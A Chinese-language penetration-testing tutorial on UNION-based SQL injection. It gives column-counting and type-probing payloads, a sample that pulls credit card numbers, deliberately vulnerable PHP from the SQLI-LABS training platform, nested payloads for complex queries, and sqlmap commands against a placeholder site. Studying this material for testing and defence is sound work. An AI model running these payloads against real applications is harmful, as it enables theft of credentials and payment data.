## 使用 UNION 技术的 SQLi 数据提取

`UNION` 关键字执行一个或多个额外的 `SELECT` 查询，并将结果附加到原始查询中。例如：

```sql
SELECT a, b FROM 原查询表 UNION SELECT c, d FROM 伪造查询表
```

此 SQL 查询返回一个包含两列的单一结果集，其中包含 `原查询表` 中 `a` 和 `b` 列的值，以及 `伪造查询表` 中 `c` 和 `d` 列的值。

当 Web 应用程序的 `SELECT` 语句存在 SQL 注入漏洞，且查询结果返回在应用程序的响应中时。通常可以使用 `UNION` 操作符执行另一次从数据库中的其他表检索数据的独立伪造查询，并将它的结果与原始查询的结果组合在一起。

然而，要成功执行此技术进行数据提取，必须满足两个条件：

1. 两个 SELECT 语句的查询结构相同：
  - 列数相同
  - 每列的数据类型应兼容或完全相同
2. 为注入另一个返回有用结果的查询，攻击者必须知道他所针对的数据库表的名称以及有关列的名称。

> 为使注入的查询能够与第一个查询结合，它不一定要使用完全相同的数据类型。但是，它们必须相互兼容，也就是说，第二个查询中的每种数据类型要么必须与第一个查询中的对应类型完全相同，要么必须隐含地转换到那个类型。数据库会将一个数字值隐含地转换为一个字符串值。实际上，`NULL` 值可被转换成任何数据类型。因此，如果不知道某个特殊字段的数据类型，只需在那个字段输入 `SELECT NULL` 即可。
>
> 许多时候，只需在第一个查询中确定一个使用字符串数据类型的字段就可以达到自己的目的。这足以允许注入任意返回字符串数据的查询并获得其结果，帮助系统性地从数据库中提取任何想要的数据。

假设示例中:

- 服务器执行查询：

    ```sql
    SELECT Name, Phone, Address FROM Users WHERE Id=$id
    ```

- 我们将设置以下 `$id` 值：

    ```sql
    $id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
    ```

- 我们将得到以下查询：

    ```sql
    SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
    ```

这将把原始查询的结果与 CreditCardTable 表中的所有信用卡号连接起来。

- `UNION ALL` 包括查询的重复项。而默认的 `UNION` 将删除重复行

- 此外，除了信用卡号之外，还选择了另外两个值以确保被 UNITON 连接的两个查询具有相同数量的参数/列，以避免语法错误。

在成功的信息收集之后，根据应用程序的不同，它可能只向测试人员显示第一个结果，因为应用程序只处理结果集的第一行。或者尝试获得仅包含伪造查询的干净输出
- 使用 `LIMIT` 子句
- 使仅第二个查询有效（也可用来区分原始查询与注入查询数据）
    - 使用一定不存在的值。如，负数 id
    - 使用 false 条件语句。如，逻辑运算符 AND 与 `1=0`（始终为假）

### 渗透测试步骤

攻击的首要任务是查明应用程序执行的最初查询所返回的列数。

确定所需的列数后，下一项任务就是找到一个使用字符串数据类型的列，以便通过它从数据库中提取出任意数据。

#### 步骤1. 确定 SELECT 语句中正确的列数 —— 使用 ORDER BY 或 UNION SELECT

SQL 中的 `ORDER BY 列数` 子句根据指定列数对结果集进行排序。
- 指定列 <= 真实列，查询将成功执行
- 指定列 > 真实列，列不存在导致返回错误

注入一系列 `ORDER BY` 子句，并递增指定的列索引，直到出现错误为止。例如，如果注入点是原始查询 `WHERE` 子句中的一个带引号的字符串，提交：

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# 依此类推
```

当指定的列索引超过结果集中实际的列数时，数据库会返回错误，例如：

```log
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

> 由于 Oracle 数据库中，每个 `SELECT` 语句必须指定一个要从中选择的表（`FROM`）。应当使用 `order by` 确认原始查询的列数后，再测试列类型 `UNION SELECT NULL`。以清晰区分列数与语句的触点（即，同时出现列数不匹配与 SELECT 语句结构错误的可能性）

或者，使用 `NULL` 可匹配任意数据类型的特性，提交一系列指定不同数量 `NULL` 值的 `UNION SELECT` 载荷，直到精确匹配正确列数

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
# 依此类推
```

如果 `NULL` 的数量与列数不匹配，数据库会返回错误，例如：

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

与 `ORDER BY` 技术类似，应用程序可能会在 HTTP 响应中直接返回数据库错误，但也可能返回通用错误或根本不返回结果。当 `NULL` 的数量与列数匹配时，数据库会在结果集中额外返回一行，每列都包含 `NULL` 值。对 HTTP 响应的影响取决于应用程序的代码。如果运气好，你会在响应中看到一些额外内容，例如 HTML 表格中多了一行。否则，`NULL` 值可能会触发不同的错误，例如 `NullPointerException`。在最坏的情况下，响应可能与错误数量的 `NULL` 引起的响应看起来相同，这会使该方法失效。

#### 步骤2. 确定易受攻击的列 —— 使用 UNION SELECT NULL

有趣数据通常是字符串形式的，下一步是找到一个使用字符串数据类型的列。测试人员使用基础查询语句 `UNION SELECT NULL...`，并系统性地用字符型代替每个 `NULL` 探测每列的类型。假设查询返回 3 列，注入以下查询：

`' UNION SELECT 'a', NULL, NULL--`
`' UNION SELECT NULL, 'a', NULL--`
`' UNION SELECT NULL, NULL, 'a'--`

- 若列的数据类型与字符串数据不兼容，注入的查询会导致数据库错误，例如：

  ```log
  Conversion failed when converting the varchar value 'a' to data type int.
  ```

- 若注入的查询得到执行，在响应中将看到额外的注入字符串值，则相关列可用来检索字符串数据。或继续探测下一列

### 服务器端示例

使用 SQLI-LABS，这是一个包含故意易受攻击的 SQL 注入场景的平台 [https://github.com/Audi-1/sqli-labs]。让我们看一下在 MySQL 5 版本上运行的此易受攻击代码。

**易受攻击的代码**
```php
if(isset($_GET['id']))
{
    // 输入源 get 请求的 id 参数
    $id=$_GET['id'];
    //logging the connection parameters to a file for analysis.
    $fp=fopen('result.txt','a');
    fwrite($fp,'ID:'.$id."\n");
    fclose($fp);
    // sql 查询注入点
    $sql="SELECT * FROM users WHERE id= '$id' LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);
    if($row)
    {
        echo 'Your Login name:'. $row['username'];
        echo 'Your Password:'. $row['password'];
    }
    else
    {
        print_r(mysql_error());
    }
}
else
{
    echo "Please input the ID as parameter with numeric value";
}
```

代码从用户输入中获取 `id` 参数，并将其直接插入到 SQL 查询中，未经任何清理，因此容易受到 SQL 注入攻击。由于注入发生在 SELECT 语句的 WHERE 子句中，我们可以使用 UNION 命令进行数据提取。

## 隐藏联合利用技术 —— 复杂上下文

大多数野外的 SQL 注入都是盲注。然而，您可以将其中一些伪盲注（复杂上下文）转换为基于联合的注入。

**识别**
以下任一方法可用于识别这些 SQL 注入：

1. 易受攻击的查询返回数据，但注入是盲注。
2. `ORDER BY` 技术有效，但您无法实现基于联合的注入。

**根本原因**
您无法使用常规 Union 技术的原因是易受攻击查询的复杂性。在 Union 技术中，您在 `UNION` 负载之后注释掉查询的其余部分。这对普通查询没问题，但在更复杂的查询中可能存在问题。如果查询的第一部分依赖于第二部分，注释掉其余部分会破坏原始查询。

### 示例1：易受攻击的查询是一个子查询，父查询负责返回数据

```sql
SELECT 
  * 
FROM 
  customers 
WHERE 
  id IN (                 --\
    SELECT                   |
      DISTINCT customer_id   |
    FROM                     |
      orders                 |--> 易受攻击的查询
    WHERE                    |
      cost > 200             |
  );                      --/
```

- _问题：_ 如果您注入一个 `UNION` 负载，它不会影响返回的数据。因为您正在修改 `WHERE` 部分。实际上，您并没有将 `UNION` 查询附加到原始查询上。
- _解决方案：_ 您需要知道后端执行的查询。然后根据该查询创建您的负载。这意味着在需要时关闭左括号或添加适当的关键字。

### 示例2：易受攻击的查询包含别名或变量声明

```sql
SELECT 
  s1.user_id, 
  (                                                                                      --\
    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = 'INJECTION_HERE' THEN 1 ELSE 0 END   |--> 易受攻击的查询
  ) AS overlap                                                                           --/
FROM 
  subscriptions AS s1 
  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id 
  AND s1.start_date <= s2.end_date 
  AND s1.end_date >= s2.start_date 
GROUP BY 
  s1.user_id
```

- _问题：_ 当您在注入负载后注释掉原始查询的其余部分时，您会破坏查询，因为某些别名或变量变为 `undefined`。
- _解决方案：_ 您需要在负载开头放置适当的关键字或别名。这样，原始查询的第一部分保持有效。

### 示例3：易受攻击查询的结果被用于第二个查询，仅第二个查询返回数据

```php
<?php
// 根据产品名称检索产品 ID
                            --\
$query1 = "SELECT              |
             id                |
           FROM                |
             products          |--> 易受攻击的查询 #1
           WHERE               |
             name = '$name'";  |
                            --/

$result1 = odbc_exec($conn, $query1);

// 根据产品 ID 检索产品评论
                              --\
$query2 = "SELECT                |
             comments            |
           FROM                  |
             products            |--> 易受攻击的查询 #2
           WHERE                 |
             id = '$result1'";   |
                              --/
                              
$result1 = odbc_exec($conn, $query2);
?>
```

- _问题：_ 您可以向第一个查询添加 `UNION` 负载，但它不会影响返回的数据。
- _解决方案：_ 您需要在第二个查询中注入。因此，第二个查询的输入不应被清理。然后，您需要使第一个查询不返回数据。现在附加一个返回要注入到 _第二个查询_ 中的负载的 `UNION` 查询。

  **示例：**
  负载的基础（您在第一个查询中注入的内容）：

  ```text
  ' AND 1 = 2 UNION SELECT "PAYLOAD" -- -
  ```

  `PAYLOAD` 是您想要注入到 _第二个查询_ 中的内容：

  ```text
  ' AND 1=2 UNION SELECT ...
  ```

  最终负载（替换 `PAYLOAD` 后）：

  ```text
  ' AND 1 = 2 UNION SELECT "' AND 1=2 UNION SELECT ..." -- -
                            \________________________/
                                        ||
                                        \/
                                 注入到第二个查询
                                   的负载
  \________________________________________________________/
                              ||
                              \/
   我们注入到易受攻击参数的实际查询
  ```

  注入后的第一个查询：

  ```sql
  SELECT               --\
    id                    |
  FROM                    |----> 第一个查询
    products              |
  WHERE                   |
    name = 'abcd'      --/
    AND 1 = 2                                 --\
  UNION                                          |----> 注入的负载（注入到第二个负载中的内容）
  SELECT                                         |
    "' AND 1=2 UNION SELECT ... -- -" -- -'   --/
  ```

  注入后的第二个查询：

  ```sql
  SELECT            --\
    comments           |
  FROM                 |----> 第二个查询
    products           |
  WHERE                |
    id = ''         --/
    AND 1 = 2         --\ 
  UNION                  |----> 注入的负载（控制返回数据的最终 UNION 查询）
  SELECT ... -- -'    --/
  ```

### 示例4：易受攻击的参数被用于多个独立的查询

```php
<?php
// 根据产品 ID 检索产品详情
$query1 = "SELECT 
             name, 
             inserted, 
             size 
           FROM 
             products 
           WHERE 
             id = '$id'";

$result1 = odbc_exec($conn, $query1);

// 根据产品 ID 检索产品评论
$query2 = "SELECT 
             comments 
           FROM 
             products 
           WHERE 
             id = '$id'";

$result2 = odbc_exec($conn, $query2);
?>
```

- _问题：_ 将 `UNION` 查询附加到第一个（或第二个）查询不会破坏它，但可能会破坏另一个。
- _解决方案：_ 这取决于应用程序的代码结构。但第一步是了解原始查询。大多数情况下，这些注入是基于时间的。此外，基于时间的负载被注入到多个查询中，这可能会带来问题。
  例如，如果您使用 `SQLMap`，这种情况会混淆该工具，并且输出会变得混乱。因为延迟将不会符合预期。

### 提取原始查询

如您所见，要实现基于联合的注入，始终需要知道原始查询。
您可以使用默认的 DBMS 表检索原始查询：

| DBMS                 | Table                          |
|----------------------|--------------------------------|
| MySQL                | INFORMATION_SCHEMA.PROCESSLIST |
| PostgreSQL           | pg_stat_activity               |
| Microsoft SQL Server | sys.dm_exec_cached_plans       |
| Oracle               | V$SQL                          |

### 复杂上下文自动化

**自动化**
自动化工作流程的步骤：

1. 使用 `SQLMap` 和盲注提取原始查询。
2. 根据原始查询构建基础负载，实现基于联合的注入。
3. 通过以下选项之一自动化利用基于联合的注入：
    - 指定 _自定义注入点标记_（`*`）
    - 使用 `--prefix` 和 `--suffix` 标志。

**示例：**
考虑上面讨论的第三个场景。
我们假设 DBMS 是 `MySQL`，第一个和第二个查询只返回一列。
这可以是您提取数据库版本的负载：

```text
' AND 1=2 UNION SELECT " ' AND 1=2 UNION SELECT @@version -- -" -- -
```

因此目标 URL 将如下：

```text
https://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-
```

自动化：

- _自定义注入点标记_（`*`）：

  ```sh
  sqlmap -u "https://example.org/search?query=abcd'AND 1=2 UNION SELECT \"*\"-- -"
  ```

- `--prefix` 和 `--suffix` 标志：

  ```sh
  sqlmap -u "https://example.org/search?query=abcd" --prefix="'AND 1=2 UNION SELECT \"" --suffix="\"-- -"
  ```
